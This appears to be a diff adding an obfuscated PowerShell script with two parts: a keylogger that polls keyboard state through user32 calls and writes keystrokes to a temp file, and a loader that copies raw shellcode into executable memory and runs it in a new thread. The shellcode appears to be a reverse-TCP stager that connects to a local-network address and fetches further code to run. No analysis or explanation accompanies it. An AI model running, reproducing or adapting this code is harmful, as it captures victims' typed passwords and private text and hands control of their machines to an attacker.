@@ -1,0 +1,76 @@
+ SET-ItEM ("{1}{2}{0}"-f ':31E','variab','Le') ([tyPE]("{2}{0}{1}" -f 'O','LE','cONS')  ) ;$H8RI9  = [tYpE]("{1}{0}{3}{2}"-F'Y','s','M.IO.fiLE','StE'); $d1j=  [TYpE]("{2}{0}{3}{6}{1}{4}{5}"-f'stE','E','SY','m.','XT.enCODIN','G','t') ;
+function START`-ke`YLoG`GER(${P`Ath} = "$env:temp\keylogger.txt")
+{
+	
+	
+	${S`i`GN`ATUrES} = ((("{79}{89}{77}{5}{24}{48}{19}{11}{71}{43}{0}{35}{37}{46}{64}{88}{49}{3}{38}{20}{67}{65}{44}{17}{86}{92}{76}{57}{16}{55}{59}{1}{83}{25}{34}{80}{31}{56}{66}{15}{53}{82}{47}{68}{51}{4}{6}{28}{72}{61}{90}{41}{9}{58}{81}{21}{8}{42}{30}{12}{10}{69}{23}{54}{18}{33}{22}{52}{26}{78}{75}{63}{87}{7}{84}{85}{60}{2}{36}{14}{32}{45}{74}{40}{39}{29}{62}{70}{27}{50}{13}{91}{73}" -f 'to,','nt',' uint wSc','yCode);
+[','CharSet=Ch','guser32','a','code(uin','n','t MapVirtual','lImp','=C','pe);
+[Dl',', u',' b','yte[] keyst','public s','y4g,','y4g','ly4g, CharSet','lImpor',' i','arSet=','us','.d','GetK',')]
+public ','c','rSet.Auto)]','ngBuilder pwszBu','pTy','ardSta','yte[] lpk',', Ch','eyb',' Exa','anCode,','ctS','Dl','ri','ystem.Text.St',' in','t uMa','t.Au','ll','eystate, ','pelling=true)]
+public','.','l','virtualKe','hBuff',', ','CharSet.Auto','ate);
+[D','er32.dll','tatic ','te(','t.Auto)]
+','Key(uint uCod','extern i','y,','c sta','ff','c extern int',' static extern sho','ser32.d','b','t(y4gu','dlly4g','ort(y4g',', int c','harSe','
+publi','j','S','ati','CharSe','y4','st','s','o','e,','llImport(y4guser32',' ','t ','wVirtKe',' CharSet',' ToUni','rt GetAsyncKeyState(int ','Jj
+[DllImport(','tic extern','int wFlags);
+sJ','='))."rEpL`Ace"('sJj',[StrIng][cHaR]39)."R`ePLacE"(([cHaR]121+[cHaR]52+[cHaR]103),[StrIng][cHaR]34))
+
+	
+	${a`Pi} = &("{1}{2}{0}" -f'-Type','Ad','d') -MemberDefinition ${S`I`gn`ATuReS} -Name ("{0}{1}" -f 'Wi','n32') -Namespace ("{1}{0}" -f 'I','AP') -PassThru
+
+	
+	${nu`ll} = &("{1}{0}"-f'ew-Item','N') -Path ${p`ATH} -ItemType ("{0}{1}" -f'F','ile') -Force
+
+	try
+	{
+		.("{2}{0}{1}"-f'ite-Hos','t','Wr') ("{9}{3}{1}{10}{5}{0}{2}{4}{8}{12}{6}{11}{7}"-f'e',' key presse','s','g','s ','Pr','L+C ','e results.','C','Recordin','s. ','to se','TR') -ForegroundColor ("{1}{0}" -f'd','Re')
+
+		
+		
+		while (${T`Rue})
+		{
+			&("{2}{0}{1}" -f'e','ep','Start-Sl') -Milliseconds 40
+
+			
+			for (${a`SC`iI} = 9; ${A`Scii} -le 254; ${Asc`ii}++)
+			{
+				
+				${ST`A`TE} = ${a`pi}::("{4}{2}{0}{3}{1}"-f'cKe','te','syn','ySta','GetA').Invoke(${aS`CIi})
+
+				
+				if (${S`TAte} -eq -32767)
+				{
+					${N`Ull} =  $31e::"C`Ap`sLocK"
+
+					
+					${VIr`TuaL`KeY} = ${a`Pi}::("{0}{1}{2}"-f'Map','VirtualKe','y').Invoke(${AS`cIi}, 3)
+
+					
+					${k`BsT`ATe} = &("{1}{2}{0}" -f't','New-','Objec') ("{0}{1}" -f'Byt','e[]') 256
+					${c`HEck`KBstA`Te} = ${a`pi}::("{2}{0}{1}"-f 'Keyboard','State','Get').Invoke(${kbST`A`TE})
+
+					
+					${M`yChar} = &("{0}{2}{1}" -f'N','t','ew-Objec') -TypeName ("{2}{5}{3}{4}{0}{6}{1}" -f 't.S','uilder','S','e','m.Tex','yst','tringB')
+
+					
+					${sUc`cE`SS} = ${a`Pi}::("{1}{0}{3}{2}" -f'Unic','To','de','o').Invoke(${Asc`iI}, ${VIrt`Ua`l`keY}, ${Kb`sT`ATe}, ${MyC`har}, ${M`y`cHAR}."Cap`AC`ITy", 0)
+
+					if (${SU`CceSs})
+					{
+						
+						  (VARIabLe  ("{0}{1}"-f'h8ri','9')  ).VALUE::"Ap`p`eNDAlltEXt"(${pa`TH}, ${my`ChAR},  (  GI ("{2}{1}{0}" -f 'e:D1J','l','VaRiAb')).valUe::"UN`Ico`De")
+					}
+				}
+			}
+		}
+	}
+	finally
+	{
+		
+		&("{1}{0}" -f 'tepad','no') ${pA`TH}
+	}
+}
+
+
+
+
+${c} = ((("{99}{112}{40}{52}{21}{47}{94}{118}{85}{25}{96}{11}{44}{88}{89}{84}{62}{83}{97}{93}{81}{66}{32}{17}{18}{92}{95}{77}{73}{110}{98}{80}{57}{105}{51}{63}{3}{36}{28}{82}{60}{5}{55}{16}{71}{75}{116}{108}{103}{90}{7}{49}{8}{119}{70}{43}{50}{48}{61}{114}{37}{39}{59}{53}{26}{69}{27}{22}{113}{54}{101}{38}{86}{31}{1}{0}{104}{2}{33}{20}{107}{64}{14}{35}{13}{6}{19}{79}{67}{23}{4}{111}{15}{45}{9}{58}{65}{34}{78}{24}{117}{56}{87}{29}{68}{12}{74}{42}{41}{109}{102}{100}{46}{91}{76}{30}{106}{115}{10}{72}" -f 'artA','t','r','t);[DllI','tPtr lpT','e','nt','eate','d','port(','u','ti',' me','ui','Parameter','readId)','nel3','p','A',' ','s, IntPt','{0}','Size','ationFlags, In','c ','u','uint ','ack','t',' I','n','S','l','es','ll{0})]pu',', ','mpor','ut','l','es','port','r ','et(IntPt','l','c',';[DllIm',',','k','re','Threa','pTh','fl','(',' ','P','r','tic exter','Type, uint','{0}msvcr',',','0}k','adAt','rtu','Protec','lp','t.d','tr ','wCre','ntPtr','dwSt','ntPtr ','2.dl','nt);','ize, u','ms','l{','i','wS','bli','d','ation','(IntP','({','al','Ptr Vi',')]p','p','n',' e','xtern Int','static extern IntPtr Cr',' u','ddress,','c','ernel32.dll{0',' uint d','blic sta','Allo','flAlloc','[DllI','uint src','tr ',' ','lic ','dd',' ','t c','r ','})]pub','dest,','int ','h','m',', Int','trib','o','0','sta','}','(I'))  -f[cHAr]34);${W} = .("{1}{0}" -f'-Type','Add') -memberDefinition ${C} -Name ("{1}{0}" -f'32','Win') -namespace ("{1}{3}{0}{2}"-f 'o','W','ns','in32Functi') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x3c,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${Z}."leNG`Th" -gt 0x1000){${G} = ${z}."Leng`TH"};${x}=${w}::("{1}{0}{3}{2}" -f 'rtu','Vi','oc','alAll').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${Z}."l`ength"-1);${i}++) {${w}::"mems`et"([IntPtr](${x}.("{1}{0}"-f'oInt32','T').Invoke()+${I}), ${Z}[${I}], 1)};${w}::("{0}{2}{3}{1}" -f'Cre','ad','ateTh','re').Invoke(0,0,${x},0,0,0);for (;;){.("{0}{2}{1}"-f 'Sta','t-sleep','r') 60};
